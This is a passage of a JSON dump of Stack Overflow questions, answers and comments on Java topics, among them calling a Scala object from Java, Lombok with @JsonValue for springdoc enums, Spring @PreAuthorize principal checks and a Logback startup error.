be a little more straightforward. You can even make a small <code>build.sbt</code> and build your project with SBT and import into IntelliJ as SBT project (requires Scala plugin). In that case you can just copy JAR into <code>lib</code> dir. See my answer here: <a href=\"https://stackoverflow.com/questions/25129227/how-to-include-an-external-jar-file-into-the-jar-with-package\" title=\"how to include an external jar file into the jar with package\">stackoverflow.com/questions/25129227/&hellip;</a>."},{"owner":{"account_id":2026267,"reputation":1220,"user_id":1811159,"accept_rate":27,"display_name":"Nicholas Humphrey"},"score":0,"creation_date":1642394640,"post_id":70736128,"comment_id":125050504,"body_markdown":"@yǝsʞǝla thanks. I managed to build a minimum Scala project and pinpointed the issue. The &quot;NoClassDefFOundError&quot; is caused by org/apache/hadoop/fs/FSDataInputStream. It&#39;s probably a dev environment issue and I&#39;m missing some libs. I&#39;ll contact the author tomorrow.","body":"@yǝsʞǝla thanks. I managed to build a minimum Scala project and pinpointed the issue. The &quot;NoClassDefFOundError&quot; is caused by org/apache/hadoop/fs/FSDataInputStream. It&#39;s probably a dev environment issue and I&#39;m missing some libs. I&#39;ll contact the author tomorrow."}],"answers":[{"tags":[],"owner":{"account_id":14357,"reputation":9128,"user_id":29470,"display_name":"Tim Moore"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1642487378,"creation_date":1642487378,"answer_id":70751177,"question_id":70736128,"body_markdown":"Answering the original question, the reason for the error &quot;cannot find symbol constructor VerifyApp()&quot; has to do with a difference between Java and Scala.\r\n\r\nIt is true that the decompiled Java code, if re-compiled, would have  a default, public, zero-argument constructor. This is a feature of the Java compiler: it inserts this default constructor into the compiled bytecode if no constructor is declared. Note that the bytecode interpreter itself does not insert a default constructor at runtime if it isn&#39;t present in the compiled bytecode.\r\n\r\nIn the original Scala source code, this was defined as a [singleton object][1]. It would have looked something like this:\r\n\r\n    object VerifyApp {\r\n      def main(args: Array[String]): Unit =\r\n        ???\r\n    }\r\n\r\nI don&#39;t know what the actual method body looks like, because it would have been compiled into a class called `VerifyApp$`, which you can see referenced in the decompiled source code in the question.\r\n\r\nIn general, the Scala compiler compiles `object` definitions by:\r\n\r\n- Creating a class with the name of the object followed by `$`, containing instance methods for methods defined on the object, a private constructor, and a static, final `MODULE$` field holding an instance of the class.\r\n- Creating a class with the plain name of the object containing static forwarder methods that invoke the matching method on that `MODULE$` instance, and _no_ constructor.\r\n\r\nYou can see this by using the `javap` program, for example:\r\n\r\n    javap -p -c com/company/VerifyApp.class com/company/VerifyApp$.class\r\n\r\nYou&#39;ll get output similar to this:\r\n\r\n    Compiled from &quot;VerifyApp.scala&quot;\r\n    public final class com.company.VerifyApp {\r\n      public static void main(java.lang.String[]);\r\n        Code:\r\n           0: getstatic     #17                 // Field com/company/VerifyApp$.MODULE$:Lcom/company/VerifyApp$;\r\n           3: aload_0\r\n           4: invokevirtual #19                 // Method com/company/VerifyApp$.main:([Ljava/lang/String;)V\r\n           7: return\r\n    }\r\n    Compiled from &quot;VerifyApp.scala&quot;\r\n    public final class com.company.VerifyApp$ {\r\n      public static final com.company.VerifyApp$ MODULE$;\r\n    \r\n      public static {};\r\n        Code:\r\n           0: new           #2                  // class com/company/VerifyApp$\r\n           3: dup\r\n           4: invokespecial #12                 // Method &quot;&lt;init&gt;&quot;:()V\r\n           7: putstatic     #14                 // Field MODULE$:Lcom/company/VerifyApp$;\r\n          10: return\r\n    \r\n      public void main(java.lang.String[]);\r\n        Code:\r\n           0: getstatic     #22                 // Field scala/Predef$.MODULE$:Lscala/Predef$;\r\n           3: invokevirtual #26                 // Method scala/Predef$.$qmark$qmark$qmark:()Lscala/runtime/Nothing$;\r\n           6: athrow\r\n    \r\n      private com.company.VerifyApp$();\r\n        Code:\r\n           0: aload_0\r\n           1: invokespecial #29                 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V\r\n           4: return\r\n    }\r\n\r\n  [1]: https://docs.scala-lang.org/tour/singleton-objects.html\r\n\r\nThe usual way to access these objects from Java is using the static forwarder methods without trying to instantiate the class. In this case, `VerifyApp.main(args)` (as you discovered).\r\n\r\nIn the rare case that you do need to access the instance directly (for example, when it implements an interface that you need an instance of), you need to use the unsightly `VerifyApp$.MODULE$` reference. It can also be assigned to another `static final` field of a Java class or interface to provide a more readable name.","title":"Java cannot find symbol for imported scala class","body":"<p>Answering the original question, the reason for the error &quot;cannot find symbol constructor VerifyApp()&quot; has to do with a difference between Java and Scala.</p>\n<p>It is true that the decompiled Java code, if re-compiled, would have  a default, public, zero-argument constructor. This is a feature of the Java compiler: it inserts this default constructor into the compiled bytecode if no constructor is declared. Note that the bytecode interpreter itself does not insert a default constructor at runtime if it isn't present in the compiled bytecode.</p>\n<p>In the original Scala source code, this was defined as a <a href=\"https://docs.scala-lang.org/tour/singleton-objects.html\" rel=\"nofollow noreferrer\">singleton object</a>. It would have looked something like this:</p>\n<pre><code>object VerifyApp {\n  def main(args: Array[String]): Unit =\n    ???\n}\n</code></pre>\n<p>I don't know what the actual method body looks like, because it would have been compiled into a class called <code>VerifyApp$</code>, which you can see referenced in the decompiled source code in the question.</p>\n<p>In general, the Scala compiler compiles <code>object</code> definitions by:</p>\n<ul>\n<li>Creating a class with the name of the object followed by <code>$</code>, containing instance methods for methods defined on the object, a private constructor, and a static, final <code>MODULE$</code> field holding an instance of the class.</li>\n<li>Creating a class with the plain name of the object containing static forwarder methods that invoke the matching method on that <code>MODULE$</code> instance, and <em>no</em> constructor.</li>\n</ul>\n<p>You can see this by using the <code>javap</code> program, for example:</p>\n<pre><code>javap -p -c com/company/VerifyApp.class com/company/VerifyApp$.class\n</code></pre>\n<p>You'll get output similar to this:</p>\n<pre><code>Compiled from &quot;VerifyApp.scala&quot;\npublic final class com.company.VerifyApp {\n  public static void main(java.lang.String[]);\n    Code:\n       0: getstatic     #17                 // Field com/company/VerifyApp$.MODULE$:Lcom/company/VerifyApp$;\n       3: aload_0\n       4: invokevirtual #19                 // Method com/company/VerifyApp$.main:([Ljava/lang/String;)V\n       7: return\n}\nCompiled from &quot;VerifyApp.scala&quot;\npublic final class com.company.VerifyApp$ {\n  public static final com.company.VerifyApp$ MODULE$;\n\n  public static {};\n    Code:\n       0: new           #2                  // class com/company/VerifyApp$\n       3: dup\n       4: invokespecial #12                 // Method &quot;&lt;init&gt;&quot;:()V\n       7: putstatic     #14                 // Field MODULE$:Lcom/company/VerifyApp$;\n      10: return\n\n  public void main(java.lang.String[]);\n    Code:\n       0: getstatic     #22                 // Field scala/Predef$.MODULE$:Lscala/Predef$;\n       3: invokevirtual #26                 // Method scala/Predef$.$qmark$qmark$qmark:()Lscala/runtime/Nothing$;\n       6: athrow\n\n  private com.company.VerifyApp$();\n    Code:\n       0: aload_0\n       1: invokespecial #29                 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V\n       4: return\n}\n</code></pre>\n<p>The usual way to access these objects from Java is using the static forwarder methods without trying to instantiate the class. In this case, <code>VerifyApp.main(args)</code> (as you discovered).</p>\n<p>In the rare case that you do need to access the instance directly (for example, when it implements an interface that you need an instance of), you need to use the unsightly <code>VerifyApp$.MODULE$</code> reference. It can also be assigned to another <code>static final</code> field of a Java class or interface to provide a more readable name.</p>\n"}],"owner":{"account_id":2026267,"reputation":1220,"user_id":1811159,"accept_rate":27,"display_name":"Nicholas Humphrey"},"comment_count":19,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1100,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"accepted_answer_id":70751177,"answer_count":1,"score":0,"last_activity_date":1642487378,"creation_date":1642389352,"question_id":70736128,"body_markdown":"I received a Scala jar and need to write a java program to use a method.\r\nThe imported Scala method definitely works because it has been in production for years.\r\n\r\nhere is the program:\r\n```Java\r\nimport com.company.VerifyApp // The imported Scala jar\r\n\r\npublic class Validation {\r\n    public static void main(String[] args) {\r\n        VerifyApp app = new VerifyApp();\r\n        app.main(args);\r\n    }\r\n}\r\n```\r\n\r\nDecompiled Scala code:\r\n```\r\npackage com.company;\r\n\r\npublic final class VerifyApp {\r\n    public static void main(String[] var0) {\r\n        VerifyApp$.MODULE$.main(var0);\r\n    }\r\n}\r\n```\r\n\r\nHere are observations:\r\n- Error message: cannot find symbol constructor VerifyApp()\r\n    - location: class com.company.VerifyApp\r\n    - Just a note that this location is correct\r\n- VerifyApp, from the decompiled code, is a final class with no constructor (thus should have a default 0-arg constructor)\r\n- I&#39;m using IntelliJ and activated the &quot;Include dependencies with &quot;Provided&quot; scope&quot; already\r\n- This is not a maven project, I just load the jar as external library\r\n- When editing, IntelliJ shows no error or warning\r\n- I checked tons of Stackoverflow posts with the same topic but couldn&#39;t find anything useful\r\n\r\nI&#39;m wondering what could be the issue?\r\n\r\n**Edit**:\r\nIntelliJ warned me I&#39;m instantiating a utility class and this mostly likely is an error. Since I&#39;m a Java newbie, I Googled a bit and found out that maybe I could directly call `VerifyApp.main(args)` without instantiating the object. This DOES pass the build, but I got a runtime error:\r\n\r\n&gt;NoClassDefFoundError, caused by ClassNotFoundException\r\n\r\nNow I&#39;m out of trick.","title":"Java cannot find symbol for imported scala class","body":"<p>I received a Scala jar and need to write a java program to use a method.\nThe imported Scala method definitely works because it has been in production for years.</p>\n<p>here is the program:</p>\n<pre><code>import com.company.VerifyApp // The imported Scala jar\n\npublic class Validation {\n    public static void main(String[] args) {\n        VerifyApp app = new VerifyApp();\n        app.main(args);\n    }\n}\n</code></pre>\n<p>Decompiled Scala code:</p>\n<pre><code>package com.company;\n\npublic final class VerifyApp {\n    public static void main(String[] var0) {\n        VerifyApp$.MODULE$.main(var0);\n    }\n}\n</code></pre>\n<p>Here are observations:</p>\n<ul>\n<li>Error message: cannot find symbol constructor VerifyApp()\n<ul>\n<li>location: class com.company.VerifyApp</li>\n<li>Just a note that this location is correct</li>\n</ul>\n</li>\n<li>VerifyApp, from the decompiled code, is a final class with no constructor (thus should have a default 0-arg constructor)</li>\n<li>I'm using IntelliJ and activated the &quot;Include dependencies with &quot;Provided&quot; scope&quot; already</li>\n<li>This is not a maven project, I just load the jar as external library</li>\n<li>When editing, IntelliJ shows no error or warning</li>\n<li>I checked tons of Stackoverflow posts with the same topic but couldn't find anything useful</li>\n</ul>\n<p>I'm wondering what could be the issue?</p>\n<p><strong>Edit</strong>:\nIntelliJ warned me I'm instantiating a utility class and this mostly likely is an error. Since I'm a Java newbie, I Googled a bit and found out that maybe I could directly call <code>VerifyApp.main(args)</code> without instantiating the object. This DOES pass the build, but I got a runtime error:</p>\n<blockquote>\n<p>NoClassDefFoundError, caused by ClassNotFoundException</p>\n</blockquote>\n<p>Now I'm out of trick.</p>\n"},{"tags":["java","jackson","swagger","lombok","springdoc"],"answers":[{"tags":[],"owner":{"account_id":1119690,"reputation":15788,"user_id":1108305,"accept_rate":47,"display_name":"M. Justin"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642487173,"creation_date":1642487173,"answer_id":70751147,"question_id":70751146,"body_markdown":"The solution is to tell Lombok to use the annotation on the generated getter method, using `@Getter(onMethod_ = @JsonValue)` on the field.\r\n\r\n```lang-java\r\npublic enum Suit {\r\n    HEARTS(&quot;Hearts&quot;), DIAMONDS(&quot;Diamonds&quot;), CLUBS(&quot;Clubs&quot;), SPADES(&quot;Spades&quot;);\r\n\r\n    @Getter(onMethod_ = @JsonValue)\r\n    private final String name;\r\n\r\n    Suit(String name) { this.name = name; }\r\n}\r\n```\r\n\r\nThe `onMethod` property is documented in the [@Getter and @Setter](https://projectlombok.org/features/GetterSetter) and the [onX](https://projectlombok.org/features/experimental/onX) documentation:\r\n\r\n&gt; To put annotations on the generated method, you can use `onMethod=@__({@AnnotationsHere})`.  […] For more details see the documentation on the [onX](https://projectlombok.org/features/experimental/onX) feature.\r\n\r\n&gt; The syntax is a little strange and depends on the javac you are using.  \r\n&gt; On javac7, to use any of the 3 `onX` features, you must wrap the annotations to be applied to the constructor / method / parameter in `@__(@AnnotationGoesHere)`. To apply multiple annotations, use `@__({@Annotation1, @Annotation2})`. The annotations can themselves obviously have parameters as well.  \r\n&gt; On javac8 and up, you add an underscore after `onMethod`, `onParam`, or `onConstructor`.\r\n","title":"How can @JsonValue be used for Swagger enum values using springdoc-openapi with a Lombok getter","body":"<p>The solution is to tell Lombok to use the annotation on the generated getter method, using <code>@Getter(onMethod_ = @JsonValue)</code> on the field.</p>\n<pre class=\"lang-java prettyprint-override\"><code>public enum Suit {\n    HEARTS(&quot;Hearts&quot;), DIAMONDS(&quot;Diamonds&quot;), CLUBS(&quot;Clubs&quot;), SPADES(&quot;Spades&quot;);\n\n    @Getter(onMethod_ = @JsonValue)\n    private final String name;\n\n    Suit(String name) { this.name = name; }\n}\n</code></pre>\n<p>The <code>onMethod</code> property is documented in the <a href=\"https://projectlombok.org/features/GetterSetter\" rel=\"nofollow noreferrer\">@Getter and @Setter</a> and the <a href=\"https://projectlombok.org/features/experimental/onX\" rel=\"nofollow noreferrer\">onX</a> documentation:</p>\n<blockquote>\n<p>To put annotations on the generated method, you can use <code>onMethod=@__({@AnnotationsHere})</code>.  […] For more details see the documentation on the <a href=\"https://projectlombok.org/features/experimental/onX\" rel=\"nofollow noreferrer\">onX</a> feature.</p>\n</blockquote>\n<blockquote>\n<p>The syntax is a little strange and depends on the javac you are using.<br />\nOn javac7, to use any of the 3 <code>onX</code> features, you must wrap the annotations to be applied to the constructor / method / parameter in <code>@__(@AnnotationGoesHere)</code>. To apply multiple annotations, use <code>@__({@Annotation1, @Annotation2})</code>. The annotations can themselves obviously have parameters as well.<br />\nOn javac8 and up, you add an underscore after <code>onMethod</code>, <code>onParam</code>, or <code>onConstructor</code>.</p>\n</blockquote>\n"}],"owner":{"account_id":1119690,"reputation":15788,"user_id":1108305,"accept_rate":47,"display_name":"M. Justin"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":1345,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1642487173,"creation_date":1642487173,"question_id":70751146,"body_markdown":"Given a Spring Boot project that uses the [springdoc-openapi](https://github.com/springdoc/springdoc-openapi) library to expose an [OpenAPI](https://swagger.io/specification/) (Swagger) endpoint documenting the Spring MVC controller endpoints of the project.\r\n\r\nOne of the enums in the project uses [`@JsonValue`](http://fasterxml.github.io/jackson-annotations/javadoc/2.13/com/fasterxml/jackson/annotation/JsonValue.html) from [Jackson](https://github.com/FasterXML/jackson) on a field to change the JSON representation of the enum.  This enum field is exposed as a getter using the [`@Getter`](https://projectlombok.org/features/GetterSetter) annotation from [Project Lombok](https://projectlombok.org):\r\n\r\n```lang-java\r\n@Getter\r\npublic enum Suit {\r\n    HEARTS(&quot;Hearts&quot;), DIAMONDS(&quot;Diamonds&quot;), CLUBS(&quot;Clubs&quot;), SPADES(&quot;Spades&quot;);\r\n\r\n    @JsonValue\r\n    private final String name;\r\n\r\n    Suit(String name) { this.name = name; }\r\n}\r\n```\r\n\r\nHowever, despite the Jackson representation being based on the field, the enum representation returned by the OpenAPI endpoint uses the `toString` value of the `enum` instead:\r\n\r\n```lang-json\r\n&quot;suit&quot;: {\r\n  &quot;type&quot;: &quot;string&quot;,\r\n  &quot;enum&quot;: [\r\n    &quot;HEARTS&quot;,\r\n    &quot;DIAMONDS&quot;,\r\n    &quot;CLUBS&quot;,\r\n    &quot;SPADES&quot;\r\n  ]\r\n}\r\n```\r\n\r\nExpected:\r\n\r\n```lang-json\r\n&quot;suit&quot;: {\r\n  &quot;type&quot;: &quot;string&quot;,\r\n  &quot;enum&quot;: [\r\n    &quot;Hearts&quot;,\r\n    &quot;Diamonds&quot;,\r\n    &quot;Clubs&quot;,\r\n    &quot;Spades&quot;\r\n  ]\r\n}\r\n```\r\n\r\nBased on [springdoc-openapi#1244](https://github.com/springdoc/springdoc-openapi/issues/1244) and [swagger-core#3998](https://github.com/swagger-api/swagger-core/issues/3998), it&#39;s clear that the `@JsonValue` annotation needs to be applied to the method, and not the field.  However, neither the above attempted approach, nor the following, work:\r\n\r\n```lang-java\r\n@Getter @JsonValue\r\npublic enum Suit {\r\n    HEARTS(&quot;Hearts&quot;), DIAMONDS(&quot;Diamonds&quot;), CLUBS(&quot;Clubs&quot;), SPADES(&quot;Spades&quot;);\r\n\r\n    private final String name;\r\n\r\n    Suit(String name) { this.name = name; }\r\n}\r\n```\r\n\r\nHow can this enum be exposed with the proper values in Swagger, while still using Lombok to generate the getter?","title":"How can @JsonValue be used for Swagger enum values using springdoc-openapi with a Lombok getter","body":"<p>Given a Spring Boot project that uses the <a href=\"https://github.com/springdoc/springdoc-openapi\" rel=\"nofollow noreferrer\">springdoc-openapi</a> library to expose an <a href=\"https://swagger.io/specification/\" rel=\"nofollow noreferrer\">OpenAPI</a> (Swagger) endpoint documenting the Spring MVC controller endpoints of the project.</p>\n<p>One of the enums in the project uses <a href=\"http://fasterxml.github.io/jackson-annotations/javadoc/2.13/com/fasterxml/jackson/annotation/JsonValue.html\" rel=\"nofollow noreferrer\"><code>@JsonValue</code></a> from <a href=\"https://github.com/FasterXML/jackson\" rel=\"nofollow noreferrer\">Jackson</a> on a field to change the JSON representation of the enum.  This enum field is exposed as a getter using the <a href=\"https://projectlombok.org/features/GetterSetter\" rel=\"nofollow noreferrer\"><code>@Getter</code></a> annotation from <a href=\"https://projectlombok.org\" rel=\"nofollow noreferrer\">Project Lombok</a>:</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Getter\npublic enum Suit {\n    HEARTS(&quot;Hearts&quot;), DIAMONDS(&quot;Diamonds&quot;), CLUBS(&quot;Clubs&quot;), SPADES(&quot;Spades&quot;);\n\n    @JsonValue\n    private final String name;\n\n    Suit(String name) { this.name = name; }\n}\n</code></pre>\n<p>However, despite the Jackson representation being based on the field, the enum representation returned by the OpenAPI endpoint uses the <code>toString</code> value of the <code>enum</code> instead:</p>\n<pre class=\"lang-json prettyprint-override\"><code>&quot;suit&quot;: {\n  &quot;type&quot;: &quot;string&quot;,\n  &quot;enum&quot;: [\n    &quot;HEARTS&quot;,\n    &quot;DIAMONDS&quot;,\n    &quot;CLUBS&quot;,\n    &quot;SPADES&quot;\n  ]\n}\n</code></pre>\n<p>Expected:</p>\n<pre class=\"lang-json prettyprint-override\"><code>&quot;suit&quot;: {\n  &quot;type&quot;: &quot;string&quot;,\n  &quot;enum&quot;: [\n    &quot;Hearts&quot;,\n    &quot;Diamonds&quot;,\n    &quot;Clubs&quot;,\n    &quot;Spades&quot;\n  ]\n}\n</code></pre>\n<p>Based on <a href=\"https://github.com/springdoc/springdoc-openapi/issues/1244\" rel=\"nofollow noreferrer\">springdoc-openapi#1244</a> and <a href=\"https://github.com/swagger-api/swagger-core/issues/3998\" rel=\"nofollow noreferrer\">swagger-core#3998</a>, it's clear that the <code>@JsonValue</code> annotation needs to be applied to the method, and not the field.  However, neither the above attempted approach, nor the following, work:</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Getter @JsonValue\npublic enum Suit {\n    HEARTS(&quot;Hearts&quot;), DIAMONDS(&quot;Diamonds&quot;), CLUBS(&quot;Clubs&quot;), SPADES(&quot;Spades&quot;);\n\n    private final String name;\n\n    Suit(String name) { this.name = name; }\n}\n</code></pre>\n<p>How can this enum be exposed with the proper values in Swagger, while still using Lombok to generate the getter?</p>\n"},{"tags":["java","spring-boot"],"comments":[{"owner":{"account_id":11766240,"reputation":578,"user_id":14056755,"display_name":"Marcin Rzepecki"},"score":1,"creation_date":1603201716,"post_id":64446167,"comment_id":113957441,"body_markdown":"I think this answer might help you: https://stackoverflow.com/a/51713982/14056755","body":"I think this answer might help you: <a href=\"https://stackoverflow.com/a/51713982/14056755\">stackoverflow.com/a/51713982/14056755</a>"},{"owner":{"account_id":16347167,"reputation":918,"user_id":11806619,"display_name":"Captain Jacky"},"score":0,"creation_date":1603265534,"post_id":64446167,"comment_id":113978693,"body_markdown":"Thanks. The post was informative, but nonetheless my code did work actually, but near `principal.id` it says  `Cannot resolve property or method &#39;id&#39; (dynamic property?)`. Not sure why and how to fix that.","body":"Thanks. The post was informative, but nonetheless my code did work actually, but near <code>principal.id</code> it says  <code>Cannot resolve property or method &#39;id&#39; (dynamic property?)</code>. Not sure why and how to fix that."}],"answers":[{"tags":[],"owner":{"account_id":18694753,"reputation":23,"user_id":13628330,"display_name":"manavchopra"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642486685,"creation_date":1642486685,"answer_id":70751085,"question_id":64446167,"body_markdown":"Use `authentication.principal.id` instead of `principal.id`, the warning will go away.","title":"How to permit access to resource only for specific user","body":"<p>Use <code>authentication.principal.id</code> instead of <code>principal.id</code>, the warning will go away.</p>\n"}],"owner":{"account_id":16347167,"reputation":918,"user_id":11806619,"display_name":"Captain Jacky"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":547,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1642486685,"creation_date":1603200422,"question_id":64446167,"body_markdown":"I am trying to allow access to this method only for admins or users, whose id is the same as its own. So basically John with ID 1 won&#39;t be able to access Matt&#39;s orders with ID 2. I&#39;ve been trying to achieve this with principal.id, but it says that id id near principal cannot be resolved. Is there any way to achieve what I want? Thank you.\r\n\r\n    @GetMapping(&quot;/users/{userId}/orders&quot;)\r\n    @PreAuthorize(&quot;hasRole(&#39;ADMIN&#39;) or #userId == principal.id&quot;)\r\n    List&lt;Order&gt; getOrdersByUserId(@PathVariable Long userId) {\r\n        log.info(&quot;Request to get user&#39;s orders by userId: {}&quot;, userId);\r\n        if (!userRepository.existsById(userId)) {\r\n            throw new UserNotFoundException(userId);\r\n        }\r\n        return orderRepository.findByClientId(userId);\r\n    }","title":"How to permit access to resource only for specific user","body":"<p>I am trying to allow access to this method only for admins or users, whose id is the same as its own. So basically John with ID 1 won't be able to access Matt's orders with ID 2. I've been trying to achieve this with principal.id, but it says that id id near principal cannot be resolved. Is there any way to achieve what I want? Thank you.</p>\n<pre><code>@GetMapping(&quot;/users/{userId}/orders&quot;)\n@PreAuthorize(&quot;hasRole('ADMIN') or #userId == principal.id&quot;)\nList&lt;Order&gt; getOrdersByUserId(@PathVariable Long userId) {\n    log.info(&quot;Request to get user's orders by userId: {}&quot;, userId);\n    if (!userRepository.existsById(userId)) {\n        throw new UserNotFoundException(userId);\n    }\n    return orderRepository.findByClientId(userId);\n}\n</code></pre>\n"},{"tags":["java","spring-boot","logback"],"comments":[{"owner":{"account_id":15428727,"reputation":156,"user_id":11130754,"display_name":"D. Mateescu"},"score":1,"creation_date":1642073292,"post_id":70695715,"comment_id":124977479,"body_markdown":"maybe renaming the folder resource to resources would help","body":"maybe renaming the folder resource to resources would help"},{"owner":{"account_id":7588318,"reputation":179,"user_id":5756695,"display_name":"CodeLearner"},"score":0,"creation_date":1642485850,"post_id":70695715,"comment_id":125076130,"body_markdown":"Sorry, The Folder name is resources only. It was a typo mistake. Edited question","body":"Sorry, The Folder name is resources only. It was a typo mistake. Edited question"},{"owner":{"account_id":209503,"reputation":22790,"user_id":460557,"accept_rate":100,"display_name":"Jorge Campos"},"score":0,"creation_date":1642486789,"post_id":70695715,"comment_id":125076346,"body_markdown":"`java.lang.ClassNotFoundException` This error means that your application is trying to load a class that is not present in your classpath, translating it to your project it means you didn&#39;t add the correct dependencies (maven/gradle) for the configuration you are using on your logback.xml file.","body":"<code>java.lang.ClassNotFoundException</code> This error means that your application is trying to load a class that is not present in your classpath, translating it to your project it means you didn&#39;t add the correct dependencies (maven/gradle) for the configuration you are using on your logback.xml file."},{"owner":{"account_id":1082349,"reputation":2292,"user_id":1078986,"accept_rate":79,"display_name":"asinkxcoswt"},"score":0,"creation_date":1642488411,"post_id":70695715,"comment_id":125076711,"body_markdown":"Could you post your `src/resources/logback.xml`, maybe the problem is in there.","body":"Could you post your <code>src&#47;resources&#47;logback.xml</code>, maybe the problem is in there."}],"owner":{"account_id":7588318,"reputation":179,"user_id":5756695,"display_name":"CodeLearner"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":5766,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1642485894,"creation_date":1642072830,"question_id":70695715,"body_markdown":"My spring boot project has logback.xml file in the path src/resources/logback.xml. While running the application from IntelliJ, unfortunately, it is finding the logback xml from another project where the project location is entirely different.\r\n\r\nThis is causing the problem below hence application startup is failed.\r\n\r\n```\r\n-INFO in ch.qos.logback.classic.LoggerContext[default] - Found resource [logback.xml] at [Another project logback path]\r\n\r\nat ch.qos.logback.core.util.DynamicClassLoadingException: Failed to instantiate type io.symphonia.lambda.logging.DefaultConsoleAppender\r\nCaused by: java.lang.ClassNotFoundException: io.symphonia.lambda.logging.DefaultConsoleAppender\r\n...\r\n...\r\nch.qos.logback.core.util.DynamicClassLoadingException: Failed to instantiate type io.symphonia.lambda.logging.DefaultConsoleAppender\r\n...\r\n...\r\nException in thread &quot;main&quot; java.lang.IllegalStateException: Logback configuration error detected: \r\nERROR in ch.qos.logback.core.joran.action.AppenderAction - Could not create an Appender of type [io.symphonia.lambda.logging.DefaultConsoleAppender]. ch.qos.logback.core.util.DynamicClassLoadingException: Failed to instantiate type io.symphonia.lambda.logging.DefaultConsoleAppender\r\nERROR in ch.qos.logback.core.joran.spi.Interpreter@3:84 - ActionException in Action for tag [appender] ch.qos.logback.core.joran.spi.ActionException: ch.qos.logback.core.util.DynamicClassLoadingException: Failed to instantiate type io.symphonia.lambda.logging.DefaultConsoleAppender\r\nERROR in ch.qos.logback.core.joran.action.AppenderRefAction - Could not find an appender named [STDOUT]. Did you define it below instead of above in the configuration file?\r\nERROR in ch.qos.logback.core.joran.action.AppenderRefAction - See http://logback.qos.ch/codes.html#appender_order for more details.\r\nat org.springframework.boot.logging.logback.LogbackLoggingSystem.loadConfiguration(LogbackLoggingSystem.java:151)\r\n```\r\n\r\nAny path settings to be done? I could not get the problem. Please help!\r\n\r\nThanks","title":"SpringBoot Application startup failed due to Logback configuration error detected","body":"<p>My spring boot project has logback.xml file in the path src/resources/logback.xml. While running the application from IntelliJ, unfortunately, it is finding the logback xml from another project where the project location is entirely different.</p>\n<p>This is causing the problem below hence application startup is failed.</p>\n<pre><code>-INFO in ch.qos.logback.classic.LoggerContext[default] - Found resource [logback.xml] at [Another project logback path]\n\nat ch.qos.logback.core.util.DynamicClassLoadingException: Failed to instantiate type io.symphonia.lambda.logging.DefaultConsoleAppender\nCaused by: java.lang.ClassNotFoundException: io.symphonia.lambda.logging.DefaultConsoleAppender\n...\n...\nch.qos.logback.core.util.DynamicClassLoadingException: Failed to instantiate type io.symphonia.lambda.logging.DefaultConsoleAppender\n...\n...\nException in thread &quot;main&quot; java.lang.IllegalStateException: Logback configuration error detected: \nERROR in ch.qos.logback.core.joran.action.AppenderAction - Could not create an Appender of type [io.symphonia.lambda.logging.DefaultConsoleAppender]. ch.qos.logback.core.util.DynamicClassLoadingException: Failed to instantiate type io.symphonia.lambda.logging.DefaultConsoleAppender\nERROR in ch.qos.logback.core.joran.spi.Interpreter@3:84 - ActionException in Action for tag [appender] ch.qos.logback.core.joran.spi.ActionException: ch.qos.logback.core.util.DynamicClassLoadingException: Failed to instantiate type io.symphonia.lambda.logging.DefaultConsoleAppender\nERROR in ch.qos.logback.core.joran.action.AppenderRefAction - Could not find an appender named [STDOUT]. Did you define it below instead of above in the configuration file?\nERROR in ch.qos.logback.core.joran.action.AppenderRefAction - See http://logback.qos.ch/codes.html#appender_order for more details.\nat org.springframework.boot.logging.logback.LogbackLoggingSystem.loadConfiguration(LogbackLoggingSystem.java:151)\n</code></pre>\n<p>Any path settings to be done? I could not get the problem. Please help!</p>\n<p>Thanks</p>\n"},{"tags":["java"],"answers":[{"tags":[],"owner":{"account_id":21285807,"reputation":100,"user_id":15663468,"display_name":"Conor Timlin"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1642351604,"creation_date":1642351604,"answer_id":70732117,"question_id":70731944,"body_markdown":"Would it be possible to create an object to handle the word. It could have a String to represent the text of the word and an array of ints representing the lines it appears on and then an int representing the frequency of it&#39;s occurances in the text. As for tracking the line you could keep track of the line you&#39;re on with a counter variable inside the while loop maybe? \r\n\r\nIf you went that route You might be better using a hashmap and treeset to store the word objects and then print them out based on some order. ","title":"How to check in which line of text the word is","body":"<p>Would it be possible to create an object to handle the word. It could have a String to represent the text of the word and an array of ints representing the lines it appears on and then an int representing the frequency of it's occurances in the text. As for tracking the line you could keep track of the line you're on with a counter variable inside the while loop maybe?</p>\n<p>If you went that route You might be better using a hashmap and treeset to store the word objects and then print them out based on some order.</p>\n"},{"tags":[],"owner":{"account_id":120154,"reputation":10077,"user_id":312407,"accept_rate":100,"display_name":"Mike Clark"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1642485853,"creation_date":1642354810,"answer_id":70732560,"question_id":70731944,"body_markdown":"Well, if you were allowed to use Maps, this is about how it would be done. Being very familiar and comfortable with how and when to use List, HashMap (aka dictionaries), and HashSet -- often in combination -- is one of the most fundamental skills in programming, in my opinion.\r\n\r\n```\r\npublic class SO {\r\n\tpublic static void main(String[] args) throws Exception {\r\n\t\tMap&lt;String, Integer&gt; wordToCount = new HashMap&lt;&gt;();\r\n\t\tMap&lt;String, Set&lt;Integer&gt;&gt; wordToLines = new HashMap&lt;&gt;();\r\n\r\n\t\tFile myObj = new File(&quot;path\\\\text.txt&quot;);\r\n\t\tScanner myReader = new Scanner(myObj);\r\n\t\tint lineNumber = 0;\r\n\t\twhile 